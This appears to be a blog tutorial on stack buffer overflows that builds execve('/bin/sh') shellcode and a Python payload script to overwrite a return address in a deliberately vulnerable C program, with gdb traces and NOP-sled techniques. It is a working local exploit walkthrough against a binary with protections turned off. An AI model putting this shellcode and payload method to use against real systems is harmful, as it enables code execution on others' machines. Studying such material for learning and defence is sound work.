---
title:  "Executing Shellcode on Stack"
date:   2025-12-01
categories: ["reverse engineering"]
tags: ["vulnerabilities", "buffer overflow","reverse engineering"]
author: Sanketh
references:
  
---

Previously we saw how to overwrite the return address of stack by passing extra bytes to an unbounded buffer. But not everytime we will have a convinient function address to overwrite. The next attempt is to place the code we want to execute directly on the stack itself.

# Embedding Shellcode in a Buffer Overflow 

## 1. What is Shellcode?

- Shellcode is machine instructions (usually written in assembly) that perform some action — often spawning a shell (/bin/sh), but can be anything.
- It is called “shellcode” not because it must open a shell, but because historically it did.

## 2. Why embed shellcode on the stack?

- Sometimes you don’t know the address of any useful existing function.
- Or the binary doesn’t have functions like system("/bin/sh").
- In these cases, the attacker places their own code (shellcode) inside the same buffer that overflows. Then somehow point `$rip` register to the location of shellcode on stack so that CPU starts executing it. 

## 3. Requirements for embedding shellcode

### 1. Executable stack

- The stack must have executable permissions.
- Many modern systems have NX (Non-Executable) protection → stack is not executable.
- CPU provides setting read, write and executable permissions at individual page level which is enforced at hardware level. This feature has been there since `80286` CPU. Executing shellcode on stack will be impossible just by marking stack pages as non-executable. 
- For learning, we usually compile with flags `-z execstack` which will make the stack executable. 

```bash
 gcc -fno-pie -no-pie -fno-stack-protector -z execstack main.c -o vuln
```

### 2. Enough space in the buffer

- Shellcode must fit entirely inside the buffer or adjacent space.

### 3. No null bytes

- When injecting shellcode via string functions like gets, scanf("%s"), strcpy, a null byte will terminate input.
- Shellcode must avoid 0x00, 0x0A, etc.

## 4. Stack-Based Shellcode Execution: A Simple Case Without ASLR

To build the payload of overflowed string we need to consider various factors, let's understand it with a simple program:

```c
#include<stdio.h>

void func() {
	char buffer[128];
	scanf("%s", buffer);
	printf("buffer is %s\n", buffer);
}

int main() {
	func();
}
```

This code contains the buffer overflow vulnerability as `scanf` doesn't perform any bounds check while copying the input to `buffer` variable on stack. 

In order to do something useful with the overflowed payload, we need to build inject machine code for a valid program that will be executed. A common goal during such attacks is to spawn a shell (advanced versions include getting root shell and reverse shells).

This is the code to spawn a shell in C

```c
#include<stdio.h>

void main() {
    char *name[2];
    name[0] = "/bin/sh";
    name[1] = NULL;
    execve(name[0], name, NULL);
}
```

To see what the compiled code looks like, let's compile it with `-static` flag, otherwise GCC will dynamically link the definition of `execve` which will be hard to extract. 

```bash
$ gcc -o shellcode -ggdb -static shellcode.c
shellcode.c: In function ‘main’:
shellcode.c:7:5: warning: implicit declaration of function ‘execve’ [-Wimplicit-function-declaration]
    7 |     execve(name[0], name, NULL);
      |     ^~~~~~
```

```bash
(gdb) disassemble main
Dump of assembler code for function main:
   0x0000000000401865 <+0>:	endbr64
   0x0000000000401869 <+4>:	push   rbp
   0x000000000040186a <+5>:	mov    rbp,rsp
   0x000000000040186d <+8>:	sub    rsp,0x20
   0x0000000000401871 <+12>:	mov    rax,QWORD PTR fs:0x28
   0x000000000040187a <+21>:	mov    QWORD PTR [rbp-0x8],rax
   0x000000000040187e <+25>:	xor    eax,eax
   0x0000000000401880 <+27>:	lea    rax,[rip+0x7d789]        # 0x47f010
   0x0000000000401887 <+34>:	mov    QWORD PTR [rbp-0x20],rax
   0x000000000040188b <+38>:	mov    QWORD PTR [rbp-0x18],0x0
   0x0000000000401893 <+46>:	mov    rax,QWORD PTR [rbp-0x20]
   0x0000000000401897 <+50>:	lea    rcx,[rbp-0x20]
   0x000000000040189b <+54>:	mov    edx,0x0
   0x00000000004018a0 <+59>:	mov    rsi,rcx
   0x00000000004018a3 <+62>:	mov    rdi,rax
   0x00000000004018a6 <+65>:	call   0x4112e0 <execve>
   0x00000000004018ab <+70>:	nop
   0x00000000004018ac <+71>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004018b0 <+75>:	sub    rax,QWORD PTR fs:0x28
   0x00000000004018b9 <+84>:	je     0x4018c0 <main+91>
   0x00000000004018bb <+86>:	call   0x412470 <__stack_chk_fail_local>
   0x00000000004018c0 <+91>:	leave
   0x00000000004018c1 <+92>:	ret

(gdb) disassemble __execve
Dump of assembler code for function execve:
   0x00000000004112e0 <+0>:	endbr64
   0x00000000004112e4 <+4>:	mov    eax,0x3b
   0x00000000004112e9 <+9>:	syscall
   0x00000000004112eb <+11>:	cmp    rax,0xfffffffffffff001
   0x00000000004112f1 <+17>:	jae    0x4112f4 <execve+20>
   0x00000000004112f3 <+19>:	ret
   0x00000000004112f4 <+20>:	mov    rcx,0xffffffffffffffc0
   0x00000000004112fb <+27>:	neg    eax
   0x00000000004112fd <+29>:	mov    DWORD PTR fs:[rcx],eax
   0x0000000000411300 <+32>:	or     rax,0xffffffffffffffff
   0x0000000000411304 <+36>:	ret
```

We have 2 options, we can write the definition of `execve` using `syscall` instruction in our shellcode or call it with `call` instruction. Former is preferred because otherwise we have to predict the address of `execve` once the program is loaded. 

This is how `execve` is defined:

```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
```

```
execve shellcode = 
    1. Put "/bin/sh" somewhere in memory
    2. Set RDI = pointer to "/bin/sh" (pathname)
    3. Set RSI = pointer to [pointer_to_/bin/sh, NULL] (argv)
    4. Set RDX = NULL (envp)
    5. Set RAX = 0x3b (syscall number 59)
    6. Execute syscall instruction
```

Based on this, we can extract only the required instructions for calling `execve`

```assembly
; execve("/bin/sh", ["/bin/sh", NULL], NULL)

section .text
global _start

_start:
    ; Push "/bin/sh" onto stack (backwards because x86 is little-endian)
    xor rdx, rdx          ; rdx = 0 (envp = NULL)
    push rdx              ; Push null terminator
    
    ; Push "/bin/sh" (8 bytes) - we use "//bin/sh" to make it 8 bytes
    mov rax, 0x68732f6e69622f2f  ; "//bin/sh" in hex (reversed)
    push rax
    
    ; Now stack has: [null][//bin/sh]
    mov rdi, rsp          ; rdi = pointer to "//bin/sh"
    
    ; Build argv array on stack
    push rdx              ; Push NULL (argv[1])
    push rdi              ; Push pointer to "//bin/sh" (argv[0])
    mov rsi, rsp          ; rsi = pointer to argv array
    
    ; Make the syscall
    mov al, 0x3b          ; syscall number 59 (execve)
    syscall               ; Execute!
```

Passing `//bin/sh` is fine here because on Unix-like systems (including Linux), multiple leading slashes are treated like a single slash for normal paths. 

```bash
$ nasm -f elf64 shellcode.asm -o shellcode.o
$ objdump -d shellcode.o

shellcode.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <_start>:
   0:	48 31 d2             	xor    %rdx,%rdx
   3:	52                   	push   %rdx
   4:	48 b8 2f 2f 62 69 6e 	movabs $0x68732f6e69622f2f,%rax
   b:	2f 73 68
   e:	50                   	push   %rax
   f:	48 89 e7             	mov    %rsp,%rdi
  12:	52                   	push   %rdx
  13:	57                   	push   %rdi
  14:	48 89 e6             	mov    %rsp,%rsi
  17:	b0 3b                	mov    $0x3b,%al
  19:	0f 05                	syscall
```

That makes the shellcode

```c
shellcode = (
    b"\x48\x31\xd2"          # xor rdx,rdx
    b"\x52"                  # push rdx
    b"\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  # mov rax, "//bin/sh"
    b"\x50"                  # push rax
    b"\x48\x89\xe7"          # mov rdi,rsp
    b"\x52"                  # push rdx
    b"\x57"                  # push rdi
    b"\x48\x89\xe6"          # mov rsi,rsp
    b"\xb0\x3b"              # mov al,0x3b
    b"\x0f\x05"              # syscall
)
```

Let's run the program and inspect some of the addresses

```bash
$ gdb -q vuln
Reading symbols from vuln...
(gdb) disass func
Dump of assembler code for function func:
   0x0000000000401156 <+0>:	endbr64
   0x000000000040115a <+4>:	push   rbp
   0x000000000040115b <+5>:	mov    rbp,rsp
   0x000000000040115e <+8>:	add    rsp,0xffffffffffffff80
   0x0000000000401162 <+12>:	lea    rax,[rbp-0x80]
   0x0000000000401166 <+16>:	mov    rsi,rax
   0x0000000000401169 <+19>:	lea    rax,[rip+0xe94]        # 0x402004
   0x0000000000401170 <+26>:	mov    rdi,rax
   0x0000000000401173 <+29>:	mov    eax,0x0
   0x0000000000401178 <+34>:	call   0x401060 <__isoc99_scanf@plt>
   0x000000000040117d <+39>:	lea    rax,[rbp-0x80]
   0x0000000000401181 <+43>:	mov    rsi,rax
   0x0000000000401184 <+46>:	lea    rax,[rip+0xe7c]        # 0x402007
   0x000000000040118b <+53>:	mov    rdi,rax
   0x000000000040118e <+56>:	mov    eax,0x0
   0x0000000000401193 <+61>:	call   0x401050 <printf@plt>
   0x0000000000401198 <+66>:	nop
   0x0000000000401199 <+67>:	leave
   0x000000000040119a <+68>:	ret
End of assembler dump.
(gdb) b *0x0000000000401178
Breakpoint 1 at 0x401178: file main.c, line 7.
(gdb) b *0x000000000040119a
Breakpoint 2 at 0x40119a: file main.c, line 10.
```

I have placed 2 breakpoints, one just before the buffe roverflow happens, another just before the function returns

```bash
Breakpoint 1, 0x0000000000401178 in func () at main.c:7
7		scanf("%s", buffer);
(gdb) p $rbp
$1 = (void *) 0x7fffffffde50
(gdb) p &buffer
$2 = (char (*)[128]) 0x7fffffffddd0
(gdb) x/25bx &buffer
0x7fffffffddd0:	0x00	0x80	0x00	0x00	0x00	0x00	0x00	0x00
0x7fffffffddd8:	0x00	0x00	0x60	0x00	0x00	0x00	0x00	0x00
0x7fffffffdde0:	0x00	0x00	0x60	0x00	0x00	0x00	0x00	0x00
0x7fffffffdde8:	0x00
```

We can see the address of buffer is at `0x7fffffffddd0` which is where we are going to place the shellcode. 

We can write a python script to build and format the shellcode

```py
#!/usr/bin/env python3
import sys

shellcode = b"\x48\x31\xd2\x52\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

payload  = shellcode
payload += b"A" * (128 - len(shellcode))      # exact padding
payload += b"BBBBBBBB"                        # saved RBP (junk)
payload += (0x7fffffffddd0).to_bytes(8, "little")  # return into shellcode

sys.stdout.buffer.write(payload)
```

Since GDB disables ASLR, the address of `buffer` is going to remain same, so i had restarted the program in GDB using 

```bash
(gdb) run < payload.bin
```

Now we can verify the shellcode is overwritten properly at the address of the buffer

```bash
(gdb) c
Continuing.
buffer is H1�RH�//bin/shPH��RWH��;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB�����

Breakpoint 2, 0x000000000040119a in func () at main.c:10
10	}
(gdb) x/25bx &buffer
0x7fffffffddd0:	0x48	0x31	0xd2	0x52	0x48	0xb8	0x2f	0x2f
0x7fffffffddd8:	0x62	0x69	0x6e	0x2f	0x73	0x68	0x50	0x48
0x7fffffffdde0:	0x89	0xe7	0x52	0x57	0x48	0x89	0xe6	0xb0
0x7fffffffdde8:	0x3b
(gdb) x/25ib &buffer
   0x7fffffffddd0:	xor    rdx,rdx
   0x7fffffffddd3:	push   rdx
   0x7fffffffddd4:	movabs rax,0x68732f6e69622f2f
   0x7fffffffddde:	push   rax
   0x7fffffffdddf:	mov    rdi,rsp
   0x7fffffffdde2:	push   rdx
   0x7fffffffdde3:	push   rdi
   0x7fffffffdde4:	mov    rsi,rsp
   0x7fffffffdde7:	mov    al,0x3b
   0x7fffffffdde9:	syscall
   0x7fffffffddeb:	rex.B
   0x7fffffffddec:	rex.B
   0x7fffffffdded:	rex.B
   0x7fffffffddee:	rex.B
   0x7fffffffddef:	rex.B
   0x7fffffffddf0:	rex.B
   0x7fffffffddf1:	rex.B
   0x7fffffffddf2:	rex.B
   0x7fffffffddf3:	rex.B
   0x7fffffffddf4:	rex.B
   0x7fffffffddf5:	rex.B
   0x7fffffffddf6:	rex.B
   0x7fffffffddf7:	rex.B
   0x7fffffffddf8:	rex.B
   0x7fffffffddf9:	rex.B
```

We can see the `$rip` has actually started executing the shellcode

```bash
Breakpoint 2, 0x000000000040119a in func () at main.c:10
10	}
(gdb) ni
0x00007fffffffddd0 in ?? ()
(gdb) x/25ib $rip
=> 0x7fffffffddd0:	xor    rdx,rdx
   0x7fffffffddd3:	push   rdx
   0x7fffffffddd4:	movabs rax,0x68732f6e69622f2f
   0x7fffffffddde:	push   rax
   0x7fffffffdddf:	mov    rdi,rsp
   0x7fffffffdde2:	push   rdx
   0x7fffffffdde3:	push   rdi
   0x7fffffffdde4:	mov    rsi,rsp
   0x7fffffffdde7:	mov    al,0x3b
   0x7fffffffdde9:	syscall
   0x7fffffffddeb:	rex.B
   0x7fffffffddec:	rex.B
   0x7fffffffdded:	rex.B
   0x7fffffffddee:	rex.B
   0x7fffffffddef:	rex.B
   0x7fffffffddf0:	rex.B
   0x7fffffffddf1:	rex.B
   0x7fffffffddf2:	rex.B
   0x7fffffffddf3:	rex.B
   0x7fffffffddf4:	rex.B
   0x7fffffffddf5:	rex.B
   0x7fffffffddf6:	rex.B
   0x7fffffffddf7:	rex.B
   0x7fffffffddf8:	rex.B
   0x7fffffffddf9:	rex.B
```

This actually resulted in a weird behaviour where GDB jumps from `0x00007fffffffdde3` to `0x00007fffffffddeb` directly, showing `syscall` was possibly skipped. But the value of `$rax` being `-38` shows its a valid error code, `ENOSYS` (Function not implemented).

```bash
0x00007fffffffddd4 in ?? ()
(gdb) ni
0x00007fffffffddde in ?? ()
(gdb) p $rax
$9 = 7526411553527181103
(gdb) ni
Warning:
Cannot insert breakpoint 0.
Cannot access memory at address 0x68732f6e69622f2f

0x00007fffffffdddf in ?? ()
(gdb) p $rax
$10 = 7526411553527181103
(gdb) ni
0x00007fffffffdde2 in ?? ()
(gdb) ni
Warning:
Cannot insert breakpoint 0.
Cannot access memory at address 0x0

0x00007fffffffdde3 in ?? ()
(gdb) ni

Program received signal SIGSEGV, Segmentation fault.
0x00007fffffffddeb in ?? ()
(gdb) p $rsi
$11 = 140737488346688
(gdb) p $rdi
$12 = 140737488346704
(gdb) p $rdx
$13 = 0
(gdb) ni

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
```

It turns out we are not passing the actual syscall number `58` in `$rax`.

```bash
0x7fffffffddd4:  movabs rax,0x68732f6e69622f2f  ← RAX gets "//bin/sh"
0x7fffffffddde:  push   rax
0x7fffffffdddf:  mov    rdi,rsp
0x7fffffffdde2:  push   rdx
0x7fffffffdde3:  push   rdi
0x7fffffffdde4:  mov    rsi,rsp
0x7fffffffdde7:  mov    al,0x3b    ← Only sets AL (low byte), not full RAX!
0x7fffffffdde9:  syscall
```

Instead now we use

```bash
mov rax, 59           # Just set the whole register directly
```

This shows the exploit worked

```bash
(gdb) x/25ib 0x7fffffffddd0
   0x7fffffffddd0:	xor    rdx,rdx
   0x7fffffffddd3:	push   rdx
   0x7fffffffddd4:	movabs rbx,0x68732f6e69622f2f
   0x7fffffffddde:	push   rbx
   0x7fffffffdddf:	mov    rdi,rsp
   0x7fffffffdde2:	push   rdx
   0x7fffffffdde3:	push   rdi
   0x7fffffffdde4:	mov    rsi,rsp
   0x7fffffffdde7:	mov    rax,0x3b
   0x7fffffffddee:	syscall
   0x7fffffffddf0:	rex.B
   0x7fffffffddf1:	rex.B
   0x7fffffffddf2:	rex.B
   0x7fffffffddf3:	rex.B
   0x7fffffffddf4:	rex.B
   0x7fffffffddf5:	rex.B
   0x7fffffffddf6:	rex.B
   0x7fffffffddf7:	rex.B
   0x7fffffffddf8:	rex.B
   0x7fffffffddf9:	rex.B
   0x7fffffffddfa:	rex.B
   0x7fffffffddfb:	rex.B
   0x7fffffffddfc:	rex.B
   0x7fffffffddfd:	rex.B
   0x7fffffffddfe:	rex.B
(gdb) c
Continuing.
process 4012 is executing new program: /usr/bin/dash
Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x401178
Cannot insert breakpoint 2.
Cannot access memory at address 0x40119a
```

Outside of GDB

```bash
$ ./vuln < payload.bin
buffer is at 0x7fffffffded0
buffer is H1�RH�//bin/shSH��RWH��H��;
$ ./vuln < payload.bin
buffer is at 0x7fffffffded0
buffer is H1�RH�//bin/shSH��RWH��H��;
$ (cat payload.bin; cat) | ./vuln
buffer is at 0x7fffffffded0
ls
buffer is H1�RH�//bin/shSH��RWH��H��;
ls
a.out  main.c  payload.bin  payload.py	payload2.py  payload3.py  shellcode  shellcode.asm  shellcode.c  shellcode.o  trace.txt  vuln
ls
a.out  main.c  payload.bin  payload.py	payload2.py  payload3.py  shellcode  shellcode.asm  shellcode.c  shellcode.o  trace.txt  vuln
pwd
/home/sanketh/assembly/vuln/buffer_overflow/stack_based_buffer_overflow/smashing_stack_for_fun_and_profit/exploit3
whoami
sanketh
```

### Why Terminal Stayed Open in Second Method?

#### Method 1: ./vuln < payload.bin (Shell Closes Immediately)

```bash
./vuln < payload.bin
```

Shell spawns but exits immediately


**What happens:**

1. `payload.bin` is redirected to stdin
2. `vuln` reads the payload, gets exploited
3. Shellcode executes and spawns `/bin/sh`
4. **The shell (`/bin/sh`) tries to read from stdin**
5. **But stdin is connected to the file `payload.bin`, which has reached EOF (end of file)**
6. Shell reads EOF → interprets this as "no more input" → exits immediately
7. You never get a chance to interact with it

#### Method 2: (cat payload.bin; cat) | ./vuln (Shell Stays Open)

```bash
(cat payload.bin; cat) | ./vuln
# Shell spawns AND stays open for interaction
```

**What happens:**

1. The subshell `(cat payload.bin; cat)` runs TWO commands in sequence:
   - `cat payload.bin` - outputs the exploit payload
   - `cat` (no arguments) - **waits and reads from YOUR keyboard (stdin)**
2. Both outputs are piped to `./vuln`'s stdin
3. `vuln` reads the payload, gets exploited
4. Shellcode spawns `/bin/sh`
5. **The shell tries to read from stdin**
6. **stdin is still connected to the pipe, and the second `cat` is waiting for YOUR input**
7. When you type commands, they go: `keyboard → cat → pipe → /bin/sh → output`
8. Shell stays open until you press `Ctrl+D` (EOF) or `exit`

## 5. Improving Reliability with NOP Sleds - No ASLR

In our previous program, we handcrafted the payload so that the return address  directly lands on our shellcode. Of course, this was possible only because we  disabled ASLR, which means the location of the stack will be the same every time  we run the program. But even with that, we had to align our shellcode at byte-level precision—a single miscalculation in the jump address will prevent the shellcode from executing and crash the program without any success.

One way to increase the chances of successful shellcode execution is to place the shellcode at the end of the overflowed buffer and pad the bytes in front  with the machine code for the `NOP` instruction (0x90 on x86-64). `NOP` simply  means "no operation"—a blank instruction used in CPUs for various purposes like  pipeline alignment and timing. When executed, the CPU doesn't need to do any  work; it simply moves to the next instruction. This can be used to our advantage:  landing anywhere in the NOP region (called a "NOP sled" or "NOP slide") means we  will eventually "slide down" to our shellcode, so we can afford some margin of error in the calculation of the jump address.

```bash
$ hexdump C payload_32.bin
hexdump: C: No such file or directory
0000000 9090 9090 9090 9090 9090 9090 9090 9090
*
0000040 3148 52d2 bb48 2f2f 6962 2f6e 6873 4853
0000050 e789 5752 8948 48e6 c0c7 003b 0000 050f
0000060 4141 4141 4141 4141 4141 4141 4141 4141
*
0000080 4242 4242 4242 4242 def0 ffff 7fff 0000
0000090
```

We can see the return address here is 32 bytes away from the original jump address, but we can execute the shellcode

```bash
$ (cat payload_32.bin; cat) | ./vuln
buffer is at 0x7fffffffded0
ls
buffer is ����������������������������������������������������������������H1�RH�//bin/shSH��RWH��H��;
ls
a.out		main.c	     payload.py   payload3.py  payload_0.bin   payload_60.bin  shellcode.asm  shellcode.o  vuln
exploit_nop.py	payload.bin  payload2.py  payload4.py  payload_32.bin  shellcode       shellcode.c    trace.txt
ls
a.out		main.c	     payload.py   payload3.py  payload_0.bin   payload_60.bin  shellcode.asm  shellcode.o  vuln
exploit_nop.py	payload.bin  payload2.py  payload4.py  payload_32.bin  shellcode       shellcode.c    trace.txt
whoami
sanketh
```

Another way to icnrease the chances is not just to add return address at the end, but to keep repeating it for few times. This way even if we miss to voerwrite the exact address, if the alignment is correct it will work. 

### Repeating the Return Address

Another technique to increase exploitation success is to repeat the return address multiple times at the end of the payload, rather than writing it just once.

**Why this works:**

When overwriting the stack, you might not hit the exact location of the saved return address due to:

- Uncertainty about the precise buffer size
- Compiler padding/alignment
- Stack frame layout variations

By repeating the return address many times, you create a larger "target zone":

```
Buffer layout:
[NOP sled][Shellcode][Padding][ret][ret][ret][ret][ret][ret][ret]...
                                 └─────────────┬────────────────┘
                                    Any of these will work!
```

